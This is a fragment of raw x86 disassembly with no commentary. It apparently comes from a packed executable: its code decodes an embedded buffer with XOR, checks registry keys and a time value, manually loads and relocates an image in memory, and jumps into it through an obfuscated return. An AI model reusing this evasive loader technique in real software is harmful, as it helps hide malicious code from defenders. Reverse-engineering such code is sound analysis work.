  444b86:	mov    eax,DWORD PTR [eax-0x4]
  444b89:	pop    ebp
  444b8a:	ret    
  444b8b:	int3   
  444b8c:	int3   
  444b8d:	int3   
  444b8e:	int3   
  444b8f:	int3   
  444b90:	push   ebp
  444b91:	mov    ebp,esp
  444b93:	sub    esp,0xc
  444b96:	mov    DWORD PTR [ebp-0x4],0x0
  444b9d:	jmp    0x444ba8
  444b9f:	mov    eax,DWORD PTR [ebp-0x4]
  444ba2:	add    eax,0x1
  444ba5:	mov    DWORD PTR [ebp-0x4],eax
  444ba8:	mov    ecx,DWORD PTR [ebp-0x4]
  444bab:	cmp    ecx,DWORD PTR [ebp+0x8]
  444bae:	jae    0x444bff
  444bb0:	mov    edx,DWORD PTR [ebp-0x4]
  444bb3:	mov    eax,DWORD PTR [ebp+0xc]
  444bb6:	movzx  ecx,WORD PTR [eax+edx*2]
  444bba:	sar    ecx,0xc
  444bbd:	cmp    ecx,0x3
  444bc0:	jne    0x444bfd
  444bc2:	mov    DWORD PTR [ebp-0xc],0xfff
  444bc9:	mov    edx,DWORD PTR [ebp-0x4]
  444bcc:	mov    eax,DWORD PTR [ebp+0xc]
  444bcf:	movzx  ecx,WORD PTR [eax+edx*2]
  444bd3:	and    ecx,DWORD PTR [ebp-0xc]
  444bd6:	add    ecx,0x43
  444bd9:	mov    DWORD PTR [ebp-0x8],ecx
  444bdc:	mov    edx,DWORD PTR [ebp+0x18]
  444bdf:	mov    eax,DWORD PTR [ebp+0x10]
  444be2:	add    eax,DWORD PTR [edx]
  444be4:	mov    ecx,DWORD PTR [ebp-0x8]
  444be7:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  444beb:	add    edx,DWORD PTR [ebp+0x14]
  444bee:	mov    eax,DWORD PTR [ebp+0x18]
  444bf1:	mov    ecx,DWORD PTR [ebp+0x10]
  444bf4:	add    ecx,DWORD PTR [eax]
  444bf6:	mov    eax,DWORD PTR [ebp-0x8]
  444bf9:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  444bfd:	jmp    0x444b9f
  444bff:	mov    esp,ebp
  444c01:	pop    ebp
  444c02:	ret    
  444c03:	int3   
  444c04:	int3   
  444c05:	int3   
  444c06:	int3   
  444c07:	int3   
  444c08:	int3   
  444c09:	int3   
  444c0a:	int3   
  444c0b:	int3   
  444c0c:	int3   
  444c0d:	int3   
  444c0e:	int3   
  444c0f:	int3   
  444c10:	push   ebp
  444c11:	mov    ebp,esp
  444c13:	sub    esp,0x24
  444c16:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444c1d:	mov    DWORD PTR [ebp-0x10],0x0
  444c24:	jmp    0x444c2f
  444c26:	mov    eax,DWORD PTR [ebp-0x10]
  444c29:	add    eax,0x4
  444c2c:	mov    DWORD PTR [ebp-0x10],eax
  444c2f:	mov    ecx,DWORD PTR [ebp-0x10]
  444c32:	cmp    ecx,DWORD PTR [ebp+0xc]
  444c35:	jae    0x444d01
  444c3b:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444c42:	cmp    DWORD PTR [ebp-0x10],0x0
  444c46:	jne    0x444c98
  444c48:	push   0x104
  444c4d:	push   0x449e2c
  444c52:	call   DWORD PTR ds:0x446cb8
  444c58:	push   0x446000
  444c5d:	push   0x449e2c
  444c62:	call   DWORD PTR ds:0x446cbc
  444c68:	push   0x0
  444c6a:	push   0x80
  444c6f:	push   0x3
  444c71:	push   0x0
  444c73:	push   0x3
  444c75:	push   0x1
  444c77:	push   0x449e2c
  444c7c:	call   DWORD PTR ds:0x446cc0
  444c82:	mov    DWORD PTR [ebp-0x4],eax
  444c85:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  444c89:	je     0x444c91
  444c8b:	cmp    DWORD PTR [ebp-0x4],0x0
  444c8f:	jne    0x444c98
  444c91:	mov    eax,0x42
  444c96:	jmp    0x444d01
  444c98:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444c9f:	mov    edx,DWORD PTR [ebp-0x10]
  444ca2:	add    edx,0x275
  444ca8:	mov    DWORD PTR ds:0x449f30,edx
  444cae:	mov    eax,DWORD PTR [ebp+0x8]
  444cb1:	add    eax,DWORD PTR [ebp-0x10]
  444cb4:	mov    ecx,DWORD PTR [eax]
  444cb6:	add    ecx,DWORD PTR [ebp-0x10]
  444cb9:	mov    edx,DWORD PTR [ebp+0x8]
  444cbc:	add    edx,DWORD PTR [ebp-0x10]
  444cbf:	mov    DWORD PTR [edx],ecx
  444cc1:	mov    eax,DWORD PTR [ebp-0xc]
  444cc4:	mov    DWORD PTR [ebp-0x14],eax
  444cc7:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444cce:	mov    ecx,DWORD PTR ds:0x449f30
  444cd4:	mov    DWORD PTR [ebp-0x24],ecx
  444cd7:	mov    edx,DWORD PTR [ebp-0x24]
  444cda:	mov    DWORD PTR [ebp-0x20],edx
  444cdd:	mov    eax,DWORD PTR [ebp-0x20]
  444ce0:	mov    DWORD PTR [ebp-0x1c],eax
  444ce3:	mov    ecx,DWORD PTR [ebp-0x1c]
  444ce6:	mov    DWORD PTR [ebp-0x18],ecx
  444ce9:	mov    edx,DWORD PTR [ebp+0x8]
  444cec:	add    edx,DWORD PTR [ebp-0x10]
  444cef:	mov    eax,DWORD PTR [edx]
  444cf1:	xor    eax,DWORD PTR [ebp-0x18]
  444cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  444cf7:	add    ecx,DWORD PTR [ebp-0x10]
  444cfa:	mov    DWORD PTR [ecx],eax
  444cfc:	jmp    0x444c26
  444d01:	mov    esp,ebp
  444d03:	pop    ebp
  444d04:	ret    
  444d05:	int3   
  444d06:	int3   
  444d07:	int3   
  444d08:	int3   
  444d09:	int3   
  444d0a:	int3   
  444d0b:	int3   
  444d0c:	int3   
  444d0d:	int3   
  444d0e:	int3   
  444d0f:	int3   
  444d10:	push   ebp
  444d11:	mov    ebp,esp
  444d13:	sub    esp,0x14
  444d16:	mov    eax,DWORD PTR [ebp+0x8]
  444d19:	cmp    DWORD PTR [eax+0x4],0x0
  444d1d:	je     0x444d67
  444d1f:	mov    DWORD PTR [ebp-0x14],0x2a1
  444d26:	mov    ecx,DWORD PTR [ebp+0x8]
  444d29:	mov    edx,DWORD PTR [ecx+0x4]
  444d2c:	sub    edx,0x8
  444d2f:	shr    edx,1
  444d31:	mov    DWORD PTR [ebp-0xc],edx
  444d34:	mov    eax,DWORD PTR [ebp+0x8]
  444d37:	add    eax,0x8
  444d3a:	mov    DWORD PTR [ebp-0x10],eax
  444d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  444d40:	push   ecx
  444d41:	mov    edx,DWORD PTR [ebp+0x10]
  444d44:	push   edx
  444d45:	mov    eax,DWORD PTR [ebp+0xc]
  444d48:	push   eax
  444d49:	mov    ecx,DWORD PTR [ebp-0x10]
  444d4c:	push   ecx
  444d4d:	mov    edx,DWORD PTR [ebp-0xc]
  444d50:	push   edx
  444d51:	call   0x444b90
  444d56:	add    esp,0x14
  444d59:	mov    eax,DWORD PTR [ebp+0x8]
  444d5c:	mov    ecx,DWORD PTR [ebp+0x8]
  444d5f:	add    ecx,DWORD PTR [eax+0x4]
  444d62:	mov    DWORD PTR [ebp+0x8],ecx
  444d65:	jmp    0x444d16
  444d67:	mov    esp,ebp
  444d69:	pop    ebp
  444d6a:	ret    
  444d6b:	int3   
  444d6c:	int3   
  444d6d:	int3   
  444d6e:	int3   
  444d6f:	int3   
  444d70:	push   ebp
  444d71:	mov    ebp,esp
  444d73:	sub    esp,0x8
  444d76:	mov    DWORD PTR [ebp-0x4],0x446018
  444d7d:	lea    eax,[ebp-0x8]
  444d80:	push   eax
  444d81:	push   0x20019
  444d86:	push   0x0
  444d88:	push   0x449e20
  444d8d:	push   0x80000002
  444d92:	call   DWORD PTR ds:0x449f34
  444d98:	test   eax,eax
  444d9a:	je     0x444da3
  444d9c:	xor    eax,eax
  444d9e:	jmp    0x444e44
  444da3:	lea    ecx,[ebp-0x8]
  444da6:	push   ecx
  444da7:	push   0x20019
  444dac:	push   0x0
  444dae:	push   0x449e24
  444db3:	push   0x80000002
  444db8:	call   DWORD PTR ds:0x449f34
  444dbe:	test   eax,eax
  444dc0:	je     0x444dc6
  444dc2:	xor    eax,eax
  444dc4:	jmp    0x444e44
  444dc6:	mov    edx,0x53
  444dcb:	mov    eax,DWORD PTR [ebp-0x4]
  444dce:	mov    WORD PTR [eax],dx
  444dd1:	lea    ecx,[ebp-0x8]
  444dd4:	push   ecx
  444dd5:	push   0x20019
  444dda:	push   0x0
  444ddc:	mov    edx,DWORD PTR [ebp-0x4]
  444ddf:	push   edx
  444de0:	mov    eax,DWORD PTR [ebp-0x8]
  444de3:	push   eax
  444de4:	call   DWORD PTR ds:0x449f34
  444dea:	test   eax,eax
  444dec:	je     0x444df2
  444dee:	xor    eax,eax
  444df0:	jmp    0x444e44
  444df2:	lea    ecx,[ebp-0x8]
  444df5:	push   ecx
  444df6:	push   0x20019
  444dfb:	push   0x0
  444dfd:	push   0x446030
  444e02:	mov    edx,DWORD PTR [ebp-0x8]
  444e05:	push   edx
  444e06:	call   DWORD PTR ds:0x449f34
  444e0c:	test   eax,eax
  444e0e:	je     0x444e1d
  444e10:	push   0x1
  444e12:	push   0x1
  444e14:	push   0x1
  444e16:	push   0x1
  444e18:	call   0x444d70
  444e1d:	lea    eax,[ebp-0x8]
  444e20:	push   eax
  444e21:	push   0x20019
  444e26:	push   0x0
  444e28:	push   0x4460a8
  444e2d:	mov    ecx,DWORD PTR [ebp-0x8]
  444e30:	push   ecx
  444e31:	call   DWORD PTR ds:0x449f34
  444e37:	test   eax,eax
  444e39:	jne    0x444e3f
  444e3b:	xor    eax,eax
  444e3d:	jmp    0x444e44
  444e3f:	call   0x444b60
  444e44:	mov    esp,ebp
  444e46:	pop    ebp
  444e47:	ret    0x10
  444e4a:	int3   
  444e4b:	int3   
  444e4c:	int3   
  444e4d:	int3   
  444e4e:	int3   
  444e4f:	int3   
  444e50:	push   ebp
  444e51:	mov    ebp,esp
  444e53:	sub    esp,0x4d4
  444e59:	pusha  
  444e5a:	mov    DWORD PTR ds:0x449f38,ebp
  444e60:	mov    DWORD PTR [ebp-0x4a0],0x0
  444e6a:	mov    DWORD PTR [ebp-0x4b4],0x80000002
  444e74:	push   0x4460b8
  444e79:	push   0x4460c8
  444e7e:	call   DWORD PTR ds:0x446c6c
  444e84:	push   eax
  444e85:	call   DWORD PTR ds:0x446b24
  444e8b:	mov    ds:0x449f34,eax
  444e90:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  444e97:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  444e9e:	lea    eax,[ebp-0x4b8]
  444ea4:	push   eax
  444ea5:	lea    ecx,[ebp-0x4bc]
  444eab:	push   ecx
  444eac:	lea    edx,[ebp-0x8]
  444eaf:	push   edx
  444eb0:	call   DWORD PTR ds:0x446cc4
  444eb6:	movzx  eax,WORD PTR [ebp-0x4bc]
  444ebd:	cmp    eax,0x21
  444ec0:	je     0x444ec9
  444ec2:	xor    eax,eax
  444ec4:	jmp    0x4451ae
  444ec9:	push   0x1
  444ecb:	push   0x1
  444ecd:	push   0x1
  444ecf:	push   0x1
  444ed1:	call   0x444d70
  444ed6:	mov    DWORD PTR [ebp-0x424],0x0
  444ee0:	mov    DWORD PTR [ebp-0x494],0x64
  444eea:	mov    DWORD PTR [ebp-0x42c],0x5
  444ef4:	mov    DWORD PTR [ebp-0x4a0],0x0
  444efe:	mov    DWORD PTR [ebp-0x464],0x0
  444f08:	mov    DWORD PTR [ebp-0x490],0x1
  444f12:	mov    DWORD PTR [ebp-0x428],0x3
  444f1c:	mov    ecx,DWORD PTR ds:0x449e28
  444f22:	push   ecx
  444f23:	call   0x444b80
  444f28:	add    esp,0x4
  444f2b:	mov    DWORD PTR [ebp-0x4a4],eax
  444f31:	mov    edx,DWORD PTR [ebp-0x4a4]
  444f37:	push   edx
  444f38:	call   0x444ae0
  444f3d:	add    esp,0x4
  444f40:	mov    DWORD PTR [ebp-0x49c],eax
  444f46:	mov    eax,DWORD PTR [ebp-0x4a4]
  444f4c:	push   eax
  444f4d:	push   0x0
  444f4f:	mov    ecx,DWORD PTR [ebp-0x49c]
  444f55:	push   ecx
  444f56:	call   0x444b20
  444f5b:	add    esp,0xc
  444f5e:	mov    edx,DWORD PTR [ebp-0x4a4]
  444f64:	mov    DWORD PTR [ebp-0x4ac],edx
  444f6a:	mov    eax,DWORD PTR [ebp-0x4a0]
  444f70:	cmp    eax,DWORD PTR [ebp-0x4a4]
  444f76:	jae    0x445002
  444f7c:	mov    ecx,DWORD PTR [ebp-0x4ac]
  444f82:	push   ecx
  444f83:	mov    edx,DWORD PTR [ebp-0x494]
  444f89:	push   edx
  444f8a:	call   0x444b30
  444f8f:	add    esp,0x8
  444f92:	mov    DWORD PTR [ebp-0x4b0],eax
  444f98:	mov    eax,DWORD PTR [ebp-0x4b0]
  444f9e:	push   eax
  444f9f:	mov    ecx,DWORD PTR ds:0x449e28
  444fa5:	add    ecx,DWORD PTR [ebp-0x464]
  444fab:	push   ecx
  444fac:	mov    edx,DWORD PTR [ebp-0x49c]
  444fb2:	add    edx,DWORD PTR [ebp-0x4a0]
  444fb8:	push   edx
  444fb9:	call   0x445afa
  444fbe:	add    esp,0xc
  444fc1:	mov    eax,DWORD PTR [ebp-0x42c]
  444fc7:	add    eax,DWORD PTR [ebp-0x494]
  444fcd:	add    eax,DWORD PTR [ebp-0x464]
  444fd3:	mov    DWORD PTR [ebp-0x464],eax
  444fd9:	mov    ecx,DWORD PTR [ebp-0x4a0]
  444fdf:	add    ecx,DWORD PTR [ebp-0x494]
  444fe5:	mov    DWORD PTR [ebp-0x4a0],ecx
  444feb:	mov    edx,DWORD PTR [ebp-0x4ac]
  444ff1:	sub    edx,DWORD PTR [ebp-0x4b0]
  444ff7:	mov    DWORD PTR [ebp-0x4ac],edx
  444ffd:	jmp    0x444f6a
  445002:	mov    eax,DWORD PTR [ebp-0x4a4]
  445008:	push   eax
  445009:	mov    ecx,DWORD PTR [ebp-0x49c]
  44500f:	push   ecx
  445010:	call   0x444c10
  445015:	add    esp,0x8
  445018:	mov    DWORD PTR [ebp-0x464],0x0
  445022:	mov    DWORD PTR [ebp-0x4c4],0x0
  44502c:	call   0x444b70
  445031:	mov    edx,DWORD PTR ds:0x449e28
  445037:	push   edx
  445038:	call   0x444b80
  44503d:	add    esp,0x4
  445040:	mov    DWORD PTR [ebp-0x4c8],eax
  445046:	mov    eax,DWORD PTR [ebp-0x4c8]
  44504c:	push   eax
  44504d:	call   0x444ae0
  445052:	add    esp,0x4
  445055:	mov    DWORD PTR [ebp-0x460],eax
  44505b:	mov    ecx,DWORD PTR [ebp-0x4c8]
  445061:	push   ecx
  445062:	push   0x0
  445064:	mov    edx,DWORD PTR [ebp-0x460]
  44506a:	push   edx
  44506b:	call   0x444b20
  445070:	add    esp,0xc
  445073:	mov    eax,DWORD PTR [ebp-0x4c8]
  445079:	mov    DWORD PTR [ebp-0x4d0],eax
  44507f:	mov    ecx,DWORD PTR [ebp-0x4c4]
  445085:	cmp    ecx,DWORD PTR [ebp-0x4c8]
  44508b:	jae    0x445117
  445091:	mov    edx,DWORD PTR [ebp-0x4d0]
  445097:	push   edx
  445098:	mov    eax,DWORD PTR [ebp-0x494]
  44509e:	push   eax
  44509f:	call   0x444b30
  4450a4:	add    esp,0x8
  4450a7:	mov    DWORD PTR [ebp-0x4d4],eax
  4450ad:	mov    ecx,DWORD PTR [ebp-0x4d4]
  4450b3:	push   ecx
  4450b4:	mov    edx,DWORD PTR ds:0x449e28
  4450ba:	add    edx,DWORD PTR [ebp-0x464]
  4450c0:	push   edx
  4450c1:	mov    eax,DWORD PTR [ebp-0x460]
  4450c7:	add    eax,DWORD PTR [ebp-0x4c4]
  4450cd:	push   eax
  4450ce:	call   0x445afa
  4450d3:	add    esp,0xc
  4450d6:	mov    ecx,DWORD PTR [ebp-0x42c]
  4450dc:	add    ecx,DWORD PTR [ebp-0x494]
  4450e2:	add    ecx,DWORD PTR [ebp-0x464]
  4450e8:	mov    DWORD PTR [ebp-0x464],ecx
  4450ee:	mov    edx,DWORD PTR [ebp-0x4c4]
  4450f4:	add    edx,DWORD PTR [ebp-0x494]
  4450fa:	mov    DWORD PTR [ebp-0x4c4],edx
  445100:	mov    eax,DWORD PTR [ebp-0x4d0]
  445106:	sub    eax,DWORD PTR [ebp-0x4d4]
  44510c:	mov    DWORD PTR [ebp-0x4d0],eax
  445112:	jmp    0x44507f
  445117:	mov    ecx,DWORD PTR [ebp-0x4c8]
  44511d:	push   ecx
  44511e:	mov    edx,DWORD PTR [ebp-0x460]
  445124:	push   edx
  445125:	call   0x444c10
  44512a:	add    esp,0x8
  44512d:	mov    eax,DWORD PTR [ebp-0x49c]
  445133:	mov    ecx,DWORD PTR [ebp-0x460]
  445139:	mov    DWORD PTR [eax],ecx
  44513b:	push   0x42000
  445140:	call   0x444ae0
  445145:	add    esp,0x4
  445148:	mov    DWORD PTR [ebp-0xc],eax
  44514b:	push   0x3f600
  445150:	mov    edx,DWORD PTR [ebp-0x49c]
  445156:	push   edx
  445157:	mov    eax,DWORD PTR [ebp-0xc]
  44515a:	add    eax,0x300
  44515f:	push   eax
  445160:	call   0x445afa
  445165:	add    esp,0xc
  445168:	mov    ecx,DWORD PTR [ebp-0xc]
  44516b:	sub    ecx,0x400000
  445171:	push   ecx
  445172:	mov    edx,DWORD PTR [ebp-0xc]
  445175:	push   edx
  445176:	mov    eax,DWORD PTR [ebp-0x460]
  44517c:	push   eax
  44517d:	call   0x444d10
  445182:	add    esp,0xc
  445185:	mov    esp,DWORD PTR ds:0x449f38
  44518b:	pop    eax
  44518c:	mov    eax,DWORD PTR [ebp-0xc]
  44518f:	add    eax,0x3f5e0
  445194:	call   0x445199
  445199:	pop    ecx
  44519a:	call   0x44519f
  44519f:	pop    ecx
  4451a0:	call   0x4451a5
  4451a5:	pop    ecx
  4451a6:	call   0x4451ab
  4451ab:	pop    ecx
  4451ac:	push   eax
  4451ad:	ret    
  4451ae:	mov    esp,ebp
  4451b0:	pop    ebp
  4451b1:	ret    
  4451b2:	jmp    DWORD PTR ds:0x446a70
  4451b8:	jmp    DWORD PTR ds:0x446a74
  4451be:	jmp    DWORD PTR ds:0x446a78
  4451c4:	jmp    DWORD PTR ds:0x446a7c
  4451ca:	jmp    DWORD PTR ds:0x446a80
  4451d0:	jmp    DWORD PTR ds:0x446a84
  4451d6:	jmp    DWORD PTR ds:0x446a88
  4451dc:	jmp    DWORD PTR ds:0x446a8c
  4451e2:	jmp    DWORD PTR ds:0x446a90
  4451e8:	jmp    DWORD PTR ds:0x446a94
  4451ee:	jmp    DWORD PTR ds:0x446a98
  4451f4:	jmp    DWORD PTR ds:0x446a9c
  4451fa:	jmp    DWORD PTR ds:0x446aa0
  445200:	jmp    DWORD PTR ds:0x446aa4
  445206:	jmp    DWORD PTR ds:0x446aa8
  44520c:	jmp    DWORD PTR ds:0x446aac
  445212:	jmp    DWORD PTR ds:0x446ab0
  445218:	jmp    DWORD PTR ds:0x446ab4
  44521e:	jmp    DWORD PTR ds:0x446ab8
  445224:	jmp    DWORD PTR ds:0x446abc
  44522a:	jmp    DWORD PTR ds:0x446ac0
  445230:	jmp    DWORD PTR ds:0x446ac4
  445236:	jmp    DWORD PTR ds:0x446ac8
  44523c:	jmp    DWORD PTR ds:0x446acc
  445242:	jmp    DWORD PTR ds:0x446ad0
  445248:	jmp    DWORD PTR ds:0x446ad4
  44524e:	jmp    DWORD PTR ds:0x446ad8
  445254:	jmp    DWORD PTR ds:0x446adc
  44525a:	jmp    DWORD PTR ds:0x446ae0
  445260:	jmp    DWORD PTR ds:0x446ae4
  445266:	jmp    DWORD PTR ds:0x446ae8
  44526c:	jmp    DWORD PTR ds:0x446aec
  445272:	jmp    DWORD PTR ds:0x446af0
  445278:	jmp    DWORD PTR ds:0x446af4
  44527e:	jmp    DWORD PTR ds:0x446af8
  445284:	jmp    DWORD PTR ds:0x446afc
  44528a:	jmp    DWORD PTR ds:0x446b00
  445290:	jmp    DWORD PTR ds:0x446b04
  445296:	jmp    DWORD PTR ds:0x446b08
  44529c:	jmp    DWORD PTR ds:0x446b0c
  4452a2:	jmp    DWORD PTR ds:0x446b10
  4452a8:	jmp    DWORD PTR ds:0x446b14
  4452ae:	jmp    DWORD PTR ds:0x446b18
  4452b4:	jmp    DWORD PTR ds:0x446b1c
  4452ba:	jmp    DWORD PTR ds:0x446b20
  4452c0:	jmp    DWORD PTR ds:0x446b24
  4452c6:	jmp    DWORD PTR ds:0x446b28
  4452cc:	jmp    DWORD PTR ds:0x446b2c
  4452d2:	jmp    DWORD PTR ds:0x446b30
  4452d8:	jmp    DWORD PTR ds:0x446b34
  4452de:	jmp    DWORD PTR ds:0x446b38
  4452e4:	jmp    DWORD PTR ds:0x446b3c
  4452ea:	jmp    DWORD PTR ds:0x446b40
  4452f0:	jmp    DWORD PTR ds:0x446b44
  4452f6:	jmp    DWORD PTR ds:0x446b48
  4452fc:	jmp    DWORD PTR ds:0x446b4c
  445302:	jmp    DWORD PTR ds:0x446b50
  445308:	jmp    DWORD PTR ds:0x446b54
  44530e:	jmp    DWORD PTR ds:0x446b58
  445314:	jmp    DWORD PTR ds:0x446b5c
  44531a:	jmp    DWORD PTR ds:0x446b60
  445320:	jmp    DWORD PTR ds:0x446b64
  445326:	jmp    DWORD PTR ds:0x446b68
  44532c:	jmp    DWORD PTR ds:0x446b6c
  445332:	jmp    DWORD PTR ds:0x446b70
  445338:	jmp    DWORD PTR ds:0x446b74
  44533e:	jmp    DWORD PTR ds:0x446b78
  445344:	jmp    DWORD PTR ds:0x446b7c
  44534a:	jmp    DWORD PTR ds:0x446b80
  445350:	jmp    DWORD PTR ds:0x446b84
  445356:	jmp    DWORD PTR ds:0x446b88
  44535c:	jmp    DWORD PTR ds:0x446b8c
  445362:	jmp    DWORD PTR ds:0x446b90
  445368:	jmp    DWORD PTR ds:0x446b94
  44536e:	jmp    DWORD PTR ds:0x446b98
  445374:	jmp    DWORD PTR ds:0x446b9c
  44537a:	jmp    DWORD PTR ds:0x446ba0
  445380:	jmp    DWORD PTR ds:0x446ba4
  445386:	jmp    DWORD PTR ds:0x446ba8
  44538c:	jmp    DWORD PTR ds:0x446bac
  445392:	jmp    DWORD PTR ds:0x446bb0
  445398:	jmp    DWORD PTR ds:0x446bb4
  44539e:	jmp    DWORD PTR ds:0x446bb8
  4453a4:	jmp    DWORD PTR ds:0x446bbc
  4453aa:	jmp    DWORD PTR ds:0x446bc0
  4453b0:	jmp    DWORD PTR ds:0x446bc4
  4453b6:	jmp    DWORD PTR ds:0x446bc8
  4453bc:	jmp    DWORD PTR ds:0x446bcc
  4453c2:	jmp    DWORD PTR ds:0x446bd0
  4453c8:	jmp    DWORD PTR ds:0x446bd4
  4453ce:	jmp    DWORD PTR ds:0x446bd8
  4453d4:	jmp    DWORD PTR ds:0x446bdc
  4453da:	jmp    DWORD PTR ds:0x446be0
  4453e0:	jmp    DWORD PTR ds:0x446be4
  4453e6:	jmp    DWORD PTR ds:0x446be8
  4453ec:	jmp    DWORD PTR ds:0x446bec
  4453f2:	jmp    DWORD PTR ds:0x446bf0
  4453f8:	jmp    DWORD PTR ds:0x446bf4
  4453fe:	jmp    DWORD PTR ds:0x446bf8
  445404:	jmp    DWORD PTR ds:0x446bfc
  44540a:	jmp    DWORD PTR ds:0x446c00
  445410:	jmp    DWORD PTR ds:0x446c04
  445416:	jmp    DWORD PTR ds:0x446c08
  44541c:	jmp    DWORD PTR ds:0x446c0c
  445422:	jmp    DWORD PTR ds:0x446c10
  445428:	jmp    DWORD PTR ds:0x446c14
  44542e:	jmp    DWORD PTR ds:0x446c18
  445434:	jmp    DWORD PTR ds:0x446c1c
  44543a:	jmp    DWORD PTR ds:0x446c20
  445440:	jmp    DWORD PTR ds:0x446c24
  445446:	jmp    DWORD PTR ds:0x446c28
  44544c:	jmp    DWORD PTR ds:0x446c2c
  445452:	jmp    DWORD PTR ds:0x446c30
  445458:	jmp    DWORD PTR ds:0x446c34
  44545e:	jmp    DWORD PTR ds:0x446c38
  445464:	jmp    DWORD PTR ds:0x446c3c
  44546a:	jmp    DWORD PTR ds:0x446c40
  445470:	jmp    DWORD PTR ds:0x446c44
  445476:	jmp    DWORD PTR ds:0x446c48
  44547c:	jmp    DWORD PTR ds:0x446c4c
  445482:	jmp    DWORD PTR ds:0x446c50
  445488:	jmp    DWORD PTR ds:0x446c54
  44548e:	jmp    DWORD PTR ds:0x446c58
  445494:	jmp    DWORD PTR ds:0x446c5c
  44549a:	jmp    DWORD PTR ds:0x446c60
  4454a0:	jmp    DWORD PTR ds:0x446c64
  4454a6:	jmp    DWORD PTR ds:0x446c68
  4454ac:	jmp    DWORD PTR ds:0x446c6c
  4454b2:	jmp    DWORD PTR ds:0x446c70
  4454b8:	jmp    DWORD PTR ds:0x446c74
  4454be:	jmp    DWORD PTR ds:0x446c78
  4454c4:	jmp    DWORD PTR ds:0x446c7c
  4454ca:	jmp    DWORD PTR ds:0x446c80
  4454d0:	jmp    DWORD PTR ds:0x446c84
  4454d6:	jmp    DWORD PTR ds:0x446c88
  4454dc:	jmp    DWORD PTR ds:0x446c8c
  4454e2:	jmp    DWORD PTR ds:0x446c90
  4454e8:	jmp    DWORD PTR ds:0x446c94
  4454ee:	jmp    DWORD PTR ds:0x446c98
  4454f4:	jmp    DWORD PTR ds:0x446c9c
  4454fa:	jmp    DWORD PTR ds:0x446ca0
  445500:	jmp    DWORD PTR ds:0x446ca4
  445506:	jmp    DWORD PTR ds:0x446ca8
  44550c:	jmp    DWORD PTR ds:0x446cac
  445512:	jmp    DWORD PTR ds:0x446cb0
  445518:	jmp    DWORD PTR ds:0x446cb4
  44551e:	jmp    DWORD PTR ds:0x446cb8
  445524:	jmp    DWORD PTR ds:0x446cbc
  44552a:	jmp    DWORD PTR ds:0x446cc0
  445530:	jmp    DWORD PTR ds:0x446cc4
  445536:	jmp    DWORD PTR ds:0x446ccc
  44553c:	jmp    DWORD PTR ds:0x446cd0
  445542:	jmp    DWORD PTR ds:0x446cd4
  445548:	jmp    DWORD PTR ds:0x446cd8
  44554e:	jmp    DWORD PTR ds:0x446cdc
  445554:	jmp    DWORD PTR ds:0x446ce0
  44555a:	jmp    DWORD PTR ds:0x446ce4
  445560:	jmp    DWORD PTR ds:0x446ce8
  445566:	jmp    DWORD PTR ds:0x446cec
  44556c:	jmp    DWORD PTR ds:0x446cf0
  445572:	jmp    DWORD PTR ds:0x446cf4
  445578:	jmp    DWORD PTR ds:0x446cf8
  44557e:	jmp    DWORD PTR ds:0x446cfc
  445584:	jmp    DWORD PTR ds:0x446d00
  44558a:	jmp    DWORD PTR ds:0x446d04
  445590:	jmp    DWORD PTR ds:0x446d08
  445596:	jmp    DWORD PTR ds:0x446d0c
  44559c:	jmp    DWORD PTR ds:0x446d10
  4455a2:	jmp    DWORD PTR ds:0x446d14
  4455a8:	jmp    DWORD PTR ds:0x446d18
  4455ae:	jmp    DWORD PTR ds:0x446d1c
  4455b4:	jmp    DWORD PTR ds:0x446d20
  4455ba:	jmp    DWORD PTR ds:0x446d24
  4455c0:	jmp    DWORD PTR ds:0x446d28
  4455c6:	jmp    DWORD PTR ds:0x446d2c
  4455cc:	jmp    DWORD PTR ds:0x446d30
  4455d2:	jmp    DWORD PTR ds:0x446d34
  4455d8:	jmp    DWORD PTR ds:0x446d38
  4455de:	jmp    DWORD PTR ds:0x446d3c
  4455e4:	jmp    DWORD PTR ds:0x446d40
  4455ea:	jmp    DWORD PTR ds:0x446d44
  4455f0:	jmp    DWORD PTR ds:0x446d48
  4455f6:	jmp    DWORD PTR ds:0x446d4c
  4455fc:	jmp    DWORD PTR ds:0x446d50
  445602:	jmp    DWORD PTR ds:0x446d54
  445608:	jmp    DWORD PTR ds:0x446d58
  44560e:	jmp    DWORD PTR ds:0x446d5c
  445614:	jmp    DWORD PTR ds:0x446d60
  44561a:	jmp    DWORD PTR ds:0x446d64
  445620:	jmp    DWORD PTR ds:0x446d68
  445626:	jmp    DWORD PTR ds:0x446d6c
  44562c:	jmp    DWORD PTR ds:0x446d70
  445632:	jmp    DWORD PTR ds:0x446d74
  445638:	jmp    DWORD PTR ds:0x446d78
  44563e:	jmp    DWORD PTR ds:0x446d7c
  445644:	jmp    DWORD PTR ds:0x446d80
  44564a:	jmp    DWORD PTR ds:0x446d84
  445650:	jmp    DWORD PTR ds:0x446d88
  445656:	jmp    DWORD PTR ds:0x446d8c
  44565c:	jmp    DWORD PTR ds:0x446d90
  445662:	jmp    DWORD PTR ds:0x446d94
  445668:	jmp    DWORD PTR ds:0x446d98
  44566e:	jmp    DWORD PTR ds:0x446d9c
  445674:	jmp    DWORD PTR ds:0x446da0
  44567a:	jmp    DWORD PTR ds:0x446da4
  445680:	jmp    DWORD PTR ds:0x446da8
  445686:	jmp    DWORD PTR ds:0x446dac
  44568c:	jmp    DWORD PTR ds:0x446db0
  445692:	jmp    DWORD PTR ds:0x446db4
  445698:	jmp    DWORD PTR ds:0x446db8
  44569e:	jmp    DWORD PTR ds:0x446dbc
  4456a4:	jmp    DWORD PTR ds:0x446dc0
  4456aa:	jmp    DWORD PTR ds:0x446dc4
  4456b0:	jmp    DWORD PTR ds:0x446dc8
  4456b6:	jmp    DWORD PTR ds:0x446dcc
  4456bc:	jmp    DWORD PTR ds:0x446dd0
  4456c2:	jmp    DWORD PTR ds:0x446dd4
  4456c8:	jmp    DWORD PTR ds:0x446dd8
  4456ce:	jmp    DWORD PTR ds:0x446ddc
  4456d4:	jmp    DWORD PTR ds:0x446de0
